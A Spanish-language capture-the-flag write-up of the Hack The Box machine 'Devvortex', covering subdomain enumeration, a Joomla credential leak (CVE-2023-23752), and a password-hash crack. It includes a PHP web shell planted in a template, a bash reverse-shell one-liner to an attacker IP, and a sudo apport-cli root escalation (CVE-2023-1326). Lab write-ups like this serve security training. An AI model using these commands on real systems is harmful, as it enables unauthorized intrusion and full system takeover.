---
layout: single
title: Devvortex - Hack The Box
excerpt: "Para resolver ésta máquina, hacemos una enumeración de sub-dominios, descubriendo así un sub-dominio el cual cuando enumeramos en busca de directorios encontramos un directorio con un nombre administrativo, el cual al entrar descubrimos qué tiene un CMS Joomla, con su respectivo panel de autenticación, nos aprovechamos de que la versión del CMS es vulnerable a acceso de información sensible, obteniendo así las credenciales válidas para un usuario del CMS, logrando así un RCE y entablarnos una Reverse Shell, obtenemos las credenciales para ingresar a la DB MySQL, y crackear el hash para un usuaro válido del sistema, luego abusamos de que el binario apport-cli y sus permisos SUDOERS para ejecutarmo como Root."
date: 2023-11-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-devvortex/devvortex_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - subdomain enumeration
  - Web Enumeration
  - CVE-2023-23752 > exposed credentials
  - CMS exploitation > RCE
  - password reuse for mysql login
  - hash cracking
  - password cracking
  - CVE-2023-1326
  - exploiting sudoers in apport-cli (Privilege escalation)
---


Para resolver ésta máquina, hacemos una enumeración de sub-dominios, descubriendo así un sub-dominio el cual cuando enumeramos en busca de directorios encontramos un directorio con un nombre administrativo, el cual al entrar descubrimos qué tiene un CMS Joomla, con su respectivo panel de autenticación, nos aprovechamos de que la versión del CMS es vulnerable a acceso de información sensible, obteniendo así las credenciales válidas para un usuario del CMS, logrando así un RCE y entablarnos una Reverse Shell, obtenemos las credenciales para ingresar a la DB MySQL, y crackear el hash para un usuaro válido del sistema, luego abusamos de que el binario apport-cli y sus permisos SUDOERS para ejecutarmo como Root.

# PortScan
___

```
# Nmap 7.93 scan initiated Sat Nov 25 15:48:07 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.242
Nmap scan report for 10.10.11.242
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 25 15:48:16 2023 -- 1 IP address (1 host up) scanned in 9.45 seconds
```

# WebSite
___
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125200148.png)


Indagando en el código fuente a primera vista no encontré nada, opté por buscar posibles directorio interesantes con "**GoBuster**" pero tampoco encontré nada, así qué decidí buscar posibles **sub-dominios** existentes para éste dominio con la misma herramienta "Gobuster".

```bash
gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devvortex.htb
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/11/25 20:14:58 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb (Status: 200) [Size: 23221]
```

Encontraríamos un sub-dominio "**dev.devvortex.htb**", lo añadimos al **"/etc/hosts"** para tener virtual hosting con ese sub-dominio y poder ver su contenido, tiene parentesco al dominio principal, y por su nombre pienso qué es una página para desarrollo y no de producción, así que procedo a enumerar directorios de éste sub-dominio con **GoBuster**.

```bash
❯ gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
===============================================================

===============================================================

/administrator/       (Status: 200) [Size: 12211]
```

Encontraríamos el directorio "**/administrator**", así que ingreso a éste porque me interesa ver qué hay, encontrándonos con un panel de autenticación del **CMS** Joomla.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125202429.png)

Se me ocurrió usar la herramienta "**joomscan**" para buscar posibles vulnerabilidades en la versión de éste Joomla, pero no encontré nada, pero al menos la herramienta me reportó la versión del **CMS**, qué es **4.2.6**, así qué indagué en internet sobre posibles vulnerabilidades para ésta versión de Joomla.

Encontré la vulnerabilidad [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce), que nos permite abusar de una verificación de acceso incorrecto de esta versión hasta la 4.0.0, para poder filtrar información privilegiada qué no deberíamos tener acceso, exactamente acceso en texto claro a las credenciales de usuarios del CMS.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125203847.png)

Procedemos a usar éstas credenciales para loguearnos como el usuario "**lewis**" en el CMS.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204027.png)

Hemos logrado acceso al CMS como "**lewis**", ahora buscamos una manera de poder ganar acceso a la máquina, lo qué se me ocurre es ver los "site templates", ver sí tenemos permiso para escribir en ellos & modificarlos de tal manera qué podamos llevar a cabo un **RCE**.

Para ello voy a **System** > Sites Templates > y selecciono el único template existente.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204201.png)

Tengo varios recursos, intento ver en cual puedo escribir.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204250.png)

Hemos logrado cambiar el recurso "**error.php**", así que ingreso un script PHP malicioso para poder llevar a cabo el RCE.

```bash
<?php system($_GET['cmd']); ?>
```

Una vez guardado, vamos al recurso "**error.php**", para poner el parámetro "**cmd**" en la URL y controlar el comando que queramos ejecutar.
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204632.png)

Estamos logrando llevar a cabo el **RCE**, así que procedemos a entablarnos una Reverse Shell con la máquina víctima.

1. Nos ponemos en escucha en nuestra máquina.
```bash
nc -nlvp PORT
```

2. Ponemos el one liner urlencode para que nos envie la shell:
```bash
bash -c "bash -i >%26 /dev/tcp/10.10.x.x/PORT 0>%261"
```

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204932.png)

Estaríamos conectados, y sólo faltaría darle tratamiento a la TTY, qué sino sabemos como [((Entra a éste POST))](https://4uli.github.io/tratamiento-tty/)

# Escalada de Privilegios #1 
___
Vemos los usuarios válidos del sistema con directorios en **home**, viendo qué tiene un directorio personal un usuario llamado "**logan**", así qué me gustaría migrar a éste usuario & ya qué el que estamos actualmente no tiene ningún privilegio qué podamos aprovechar para convertirnos a Root, por lo qué se me ocurre ver sí hay reutilización de contraseñas, pero no.

Indagando, en la carpeta del código fuente del **sub-dominio**, en "**/var/www/**", vemos el recurso.
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205328.png)

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205546.png)

vemos lo qué aparentemente sería el usuario de la base de datos **MySQL**, corroboro qué haya algún puerto con este servicio corriendo.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205928.png)

Qué suele usarse para servicio **MySQL**, así que opto por intentar ingresar con éste usuario & reusando la contraseña que usé para el **CMS** para ver si logro acceso.

```bash
mysql -u lewis -p -h localhost -D joomla
```

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125210145.png)

Logrando acceso, así qué listando las tablas interesantes de la **DB Joomla**, me encontré con una tabla de mi interés.
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125210255.png)

que tendría como contenido en sus columnas, lo siguiente:

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211225.png)

Siendo primero el nombre  luego nombre de usuario, correo y por último la contraseña, pero está hasheada.

Así qué se me ocurre tratar de aplicar fuerza bruta con la herramienta **"John The Ripper"** al hash, para ver sí podríamos ver la contraseña de éste usuario.

1. Creamos el archivo con el hash
```bash
nano hash
```
2. Ponemos dentro el nombre de usuario, separado por dos puntos & luego el hash.
```bash
logan:hash
```

3. Una vez guardamos, usamos la herramienta "**John The Ripper**" usando como diccionario el **rockyou.txt**.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

y nos reportará la contraseña que coincide con el hash.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211657.png)

intentamos convertirnos en **logan** con éstas credenciales.

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211728.png)

# Escalada de Privilegios #2 
_____

sí como "**logan**" vemos los permisos **SUDOERS**
```bash
sudo -l
```

![](/assets/images/htb-writeup-devvortex/Pasted image 20231125212033.png)

Vemos qué podemos ejecutar como quien sea el "**apport-cli**", no tengo ni idea qué esto, así que hago una búsqueda rápida en internet, y descubro qué es una herramienta que sirve para informe de errores, indago más para posibles abusos con éste binario & me encuentro con la vulnerabilidad [CVE-2023-1326](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb), qué nos dice que si podemos ejecutar con sudo éste programa podríamos aprovecharnos de ésto para convertirnos en usuario root, así que procedo a guiarme del **PoC** para llevar a cabo la escalada.

1. Generamos el archivo qué usaremos para el "informe de error":
```bash
sudo /usr/bin/apport-cli -f /var/crash/archivo.crash --pid=23
```

2. Una vez cargue, elegimos la opción "**V**".

3. Llamamos una **bash**.
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125213018.png)

Convirtiéndonos en **Root**.
![](/assets/images/htb-writeup-devvortex/Pasted image 20231125213100.png)
